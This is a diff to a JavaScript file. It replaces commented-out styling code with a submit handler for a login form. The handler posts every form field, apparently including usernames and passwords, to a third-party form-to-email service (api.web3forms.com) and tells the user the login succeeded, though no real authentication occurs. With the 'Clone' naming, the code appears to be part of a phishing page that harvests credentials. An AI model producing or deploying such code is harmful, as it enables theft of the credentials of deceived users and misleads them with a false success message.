@@ -1,16 +1,31 @@
-// input=document.querySelectorAll("input");
-// body=document.querySelector("#inCloneCont");
-// console.log(input);
+  const form = document.getElementById('loginForm');
+  const result = document.getElementById('result');
 
-// input[0].addEventListener("click",()=>{
-//     input[0].style.border="1px solid red";
-// });
+  form.addEventListener('submit', async (e) => {
+    e.preventDefault(); // Prevent page redirect
 
-// input[1].addEventListener("click",()=>{
-//     input[1].style.border="1px solid red";
-// });
+    result.textContent = "Submitting...";
 
-// body.addEventListener("click",()=>{
-//     body.style.border="1px solid rgb(22, 45, 177)";
-// });
+    const formData = new FormData(form);
 
+    try {
+      const response = await fetch("https://api.web3forms.com/submit", {
+        method: "POST",
+        body: formData
+      });
+
+      const data = await response.json();
+
+      if (data.success) {
+        result.style.color = "green";
+        result.textContent = "✅ Login done successfully!";
+        form.reset();
+      } else {
+        result.style.color = "red";
+        result.textContent = "❌ Something went wrong, please try again!";
+      }
+    } catch (error) {
+      result.style.color = "red";
+      result.textContent = "⚠️ Network error!";
+    }
+  });
